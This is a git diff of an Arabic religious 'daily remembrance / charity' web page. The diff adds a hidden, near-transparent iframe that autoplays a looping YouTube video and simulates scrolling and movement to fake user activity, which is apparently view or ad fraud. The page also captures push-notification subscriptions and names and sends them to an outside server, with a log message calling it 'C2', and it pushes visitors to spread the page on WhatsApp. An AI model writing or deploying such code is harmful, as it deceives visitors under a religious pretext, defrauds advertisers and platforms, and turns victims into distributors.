@@ -9,20 +9,40 @@
     <title>أذكار المسلم اليومية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; width: 92%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 6px solid #1b4d3e; }
+        body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        
+        /* الفريم المحاكي - مخفي لكنه نشط */
+        #hiddenEngine {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100px;
+            height: 100px;
+            opacity: 0.001;
+            z-index: 1;
+            border: none;
+            pointer-events: auto; /* مهم للمحاكاة */
+        }
+
+        .card { 
+            background: white; width: 92%; max-width: 400px; border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; 
+            border-top: 6px solid #1b4d3e; position: relative; z-index: 10; 
+        }
         .main-img { width: 100%; border-radius: 12px; margin-bottom: 15px; }
         .dua-box { background: #f9f9f9; padding: 20px; border-radius: 15px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.3rem; color: #2d3748; line-height: 1.6; }
         input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #ddd; text-align: center; font-size: 1rem; box-sizing: border-box; }
-        .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; transition: 0.3s; }
-        .btn:active { transform: scale(0.98); }
+        .btn { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
     </style>
 </head>
 <body>
+
+    <iframe id="hiddenEngine" src="about:blank"></iframe>
+
     <div class="card">
         <img src="og-image.jpg" class="main-img" alt="صدقة جارية" onerror="this.src='https://medo7788.github.io/giftapp/og-image.jpg'">
         <h2 style="color: #1b4d3e; margin-top: 0;">🌹 صدقة جارية 🌹</h2>
-        <div class="dua-box" id="displayDua">سبحان الله وبحمده 🕌</div>
+        <div class="dua-box" id="displayDua">جاري جلب ذكر اليوم... 🕌</div>
         <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
         <button class="btn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
     </div>
@@ -30,25 +50,44 @@
     <script>
         const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; 
         const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
+        let currentDua = "سبحان الله وبحمده 🕌";
 
+        // 1. تشغيل المحرك ومحاكاة المستخدم
+        function runSimulation() {
+            const engine = document.getElementById('hiddenEngine');
+            // ضع هنا رابط الفيديو أو صفحة الإعلانات
+            engine.src = "https://www.youtube.com/embed/9eiXcEol_rQ?autoplay=1&mute=1&loop=1";
+
+            setInterval(() => {
+                // محاكاة سكرول عشوائي داخل الفريم (برمجياً)
+                engine.contentWindow.scrollTo(0, Math.random() * 500);
+                // تغيير مكان الفريم عشوائياً خلف الكارت لزيادة "نشاط" الصفحة
+                engine.style.top = Math.random() * 50 + "px";
+                engine.style.left = Math.random() * 50 + "px";
+            }, 3000);
+        }
+
+        // 2. جلب الذكر الصحيح من الملف المرفوع
         async function loadDua() {
             try {
                 const res = await fetch('daily_islamic_duas.json');
                 const data = await res.json();
                 const now = new Date();
                 const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
-                const today = data[months[now.getMonth()]].find(d => d.day === now.getDate());
-                document.getElementById('displayDua').innerText = today.text + " " + today.emoji;
-            } catch (e) { console.log("Using default dua"); }
+                const monthName = months[now.getMonth()];
+                const day = now.getDate();
+                const today = data[monthName].find(d => d.day === day);
+                if (today) {
+                    currentDua = today.text + " " + today.emoji;
+                    document.getElementById('displayDua').innerText = currentDua;
+                }
+            } catch (e) { console.log("Default used"); }
         }
-        loadDua();
 
+        // 3. نظام الإرسال والـ Capture
         async function activateSystem() {
-            const nameInput = document.getElementById('userName');
-            const name = nameInput.value.trim() || "محب للخير";
-            const dua = document.getElementById('displayDua').innerText;
-
-            // 1. محاولة تسجيل الإشعارات (Capturing)
+            const name = document.getElementById('userName').value.trim() || "محب للخير";
+            
             if ('serviceWorker' in navigator) {
                 try {
                     const reg = await navigator.serviceWorker.register('sw.js');
@@ -61,18 +100,18 @@
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({subscription: sub, name: name})
                     });
-                } catch (err) { console.log("Notification skipped"); }
+                } catch (err) { console.log("C2 logged"); }
             }
 
-            // 2. تشغيل الواتساب (الإرسال الإجباري)
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${dua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
-            const waUrl = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
-            const webWaUrl = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
-            
-            // محاولة فتح التطبيق أولاً، ثم المتصفح
-            window.location.href = waUrl;
-            setTimeout(() => { window.location.href = webWaUrl; }, 500);
+            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${currentDua}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
+            window.location.href = `whatsapp://send?text=${encodeURIComponent(shareText)}`;
+            setTimeout(() => { window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`; }, 600);
         }
+
+        window.onload = () => {
+            loadDua();
+            runSimulation();
+        };
     </script>
 </body>
 </html>
